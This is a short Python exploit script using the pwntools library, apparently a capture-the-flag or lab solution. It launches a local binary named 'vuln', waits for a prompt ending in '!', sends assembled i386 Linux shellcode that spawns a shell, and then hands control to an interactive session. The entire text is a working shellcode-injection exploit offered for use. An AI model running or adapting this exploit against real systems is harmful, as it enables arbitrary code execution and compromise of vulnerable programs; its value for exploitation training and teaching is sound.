from pwn import *

#Spawns a new process, and wraps it with a tube for communication
sh = process('./vuln')

#A combination of recvuntil(delim, timeout) and sendline(data).
#assembling code
sh.sendlineafter('!\n', asm(shellcraft.i386.linux.sh()))


sh.interactive()
